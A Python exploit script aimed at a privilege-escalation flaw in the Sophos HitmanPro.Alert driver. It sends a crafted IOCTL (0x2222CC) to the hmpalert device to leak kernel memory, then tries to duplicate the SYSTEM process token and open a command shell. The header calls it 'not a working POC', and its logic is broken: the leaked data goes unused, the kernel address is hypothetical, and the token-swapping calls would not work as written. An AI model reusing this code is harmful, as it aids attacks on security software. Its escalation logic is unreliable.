# Sophos HitmanPro.Alert hmpalert 0x2222CC privilege escalation vulnerability abused by attacker to escalade their privileges
# not a working POC - just the logic behind the exploitation

import win32file
import win32con
import struct
import ctypes
import subprocess
from ctypes import wintypes

# Constants
SYSTEM_PID = 4
KERNEL_ADDRESS = 0x7FFD8000  # Hypothetical leaked address, modify as needed

# Define necessary ctypes structures
class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", wintypes.LUID_AND_ATTRIBUTES * 1)
    ]

# Define PROCESS_BASIC_INFORMATION structure
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("ExitStatus", ctypes.c_long),
        ("PebBaseAddress", ctypes.c_void_p),
        ("AffinityMask", ctypes.c_void_p),
        ("BasePriority", ctypes.c_long),
        ("UniqueProcessId", ctypes.c_void_p),
        ("InheritedFromUniqueProcessId", ctypes.c_void_p)
    ]

def leak_memory():
    fileName = u'\\\\.\\hmpalert'
    hFile = win32file.CreateFileW(fileName,
                                  win32con.GENERIC_READ | win32con.GENERIC_WRITE,
                                  0,
                                  None,
                                  win32con.OPEN_EXISTING, 0, None)

    ioctl = 0x222244 + 0x88
    inputBuffer = struct.pack("<I", KERNEL_ADDRESS)  # srcAddress
    inputBuffer += struct.pack("<I", 0x80400000)     # dstAddress
    inputBuffer += struct.pack("<I", 0x24)           # srcSize
    inputBufferLen = len(inputBuffer)
    outBufferLen = 16

    print("Sending IOCTL: 0x%x" % ioctl)
    buf = win32file.DeviceIoControl(hFile, ioctl, inputBuffer, outBufferLen)

    return buf

def escalate_privileges():
    print("Escalating privileges to SYSTEM...")
    
    # Get handle to the current process
    h_process = ctypes.windll.kernel32.GetCurrentProcess()

    # Get handle to the current process token
    token_handle = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.OpenProcessToken(h_process, win32con.TOKEN_ALL_ACCESS, ctypes.byref(token_handle))

    # Get SYSTEM token using SYSTEM PID (typically PID 4)
    system_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, SYSTEM_PID)
    system_token = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.OpenProcessToken(system_process, win32con.TOKEN_DUPLICATE, ctypes.byref(system_token))

    # Duplicate the SYSTEM token
    duplicated_token = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.DuplicateTokenEx(system_token, win32con.TOKEN_ALL_ACCESS, None, ctypes.c_int(2), ctypes.c_int(1), ctypes.byref(duplicated_token))

    # Assign the SYSTEM token to the current process
    ctypes.windll.advapi32.SetTokenInformation(token_handle, ctypes.c_int(1), ctypes.byref(duplicated_token), ctypes.sizeof(duplicated_token))

    # Check if we now have SYSTEM privileges
    if ctypes.windll.advapi32.ImpersonateLoggedOnUser(duplicated_token):
        print("Privileges successfully escalated to SYSTEM.")
    else:
        print("Privilege escalation failed.")

def pop_system_shell():
    # Launch a SYSTEM command shell
    subprocess.call("cmd.exe")

if __name__ == "__main__":
    # Leak kernel memory
    memory_leak_data = leak_memory()

    # Automatically escalate privileges using the leaked memory
    escalate_privileges()

    # Pop a SYSTEM shell
    pop_system_shell()
